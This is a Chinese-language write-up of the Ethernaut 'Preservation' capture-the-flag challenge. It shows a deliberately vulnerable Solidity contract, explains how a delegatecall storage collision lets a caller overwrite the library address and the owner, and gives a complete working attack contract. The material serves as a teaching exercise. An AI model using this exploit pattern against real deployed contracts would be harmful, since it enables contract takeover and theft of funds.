# Preservation
## 題目
<img width="769" alt="截圖 2024-09-15 下午11 13 00" src="https://github.com/user-attachments/assets/32ca544b-6e98-490a-b610-c7cf96dfca6a">

## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
### 漏洞分析
- `delegatecall` 會在呼叫方（即 `Preservation` 合約）的上下文中執行被調用合約的邏輯，這意味著被調用合約的 `setTime` 函數實際上會修改 `Preservation` 合約的變量，而不是 `LibraryContract` 本身的變量。

### 解說
- `Preservation` 合約中的 `timeZone1Library` 和 `timeZone2Library` 是可修改的合約地址，而這些地址在 `delegatecall` 中會決定被調用的合約。
- 在使用 `setFirstTime` 或 `setSecondTime` 時，如果攻擊者能夠修改 `timeZone1Library`，那麼攻擊者可以將 `timeZone1Library` 指向惡意合約，並通過 `delegatecall` 執行攻擊者自定義的代碼。

### 攻擊思路
- 利用 `delegatecall` 可以讓我們更改 `Preservation` 合約中的變數，包括 `timeZone1Library` 和 `owner`。
- 我們的攻擊策略是，首先使用 `setFirstTime` 函數來改寫 `timeZone1Library`，將它指向我們的攻擊合約，然後再利用這個新的 `timeZone1Library` 合約來修改 `owner`。

## hack
```solidity
pragma solidity ^0.8.0;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Hack {
    // 攻擊合約與 Preservation 合約對齊的存儲變數
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        // 第一步：將 timeZone1Library 修改為攻擊合約的地址
        target.setFirstTime(uint256(uint160(address(this))));
        
        // 第二步：再次呼叫 setFirstTime，這次實際上會執行攻擊合約中的 setTime 函數，修改 Preservation 的 owner
        target.setFirstTime(uint256(uint160(msg.sender)));

        // 確認攻擊成功
        require(target.owner() == msg.sender, "hack failed");
    }

    // 修改 owner 的函數，這裡會被 delegatecall 調用
    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
```
1. **Step 1: 改寫 `timeZone1Library`**
   - 呼叫 `Preservation` 合約的 `setFirstTime` 函數，將我們的攻擊合約地址轉換為 `uint256` 後傳入。由於 `delegatecall` 的特性，這會將 `Preservation` 合約的 `timeZone1Library` 替換為攻擊合約的地址。
2. **Step 2: 改寫 `owner`**
   - 再次呼叫 `setFirstTime`，這次 `delegatecall` 將呼叫攻擊合約的 `setTime` 函數，因為現在 `timeZone1Library` 已經是攻擊合約。這樣我們就能夠將 `owner` 改為我們的地址（`msg.sender`）。
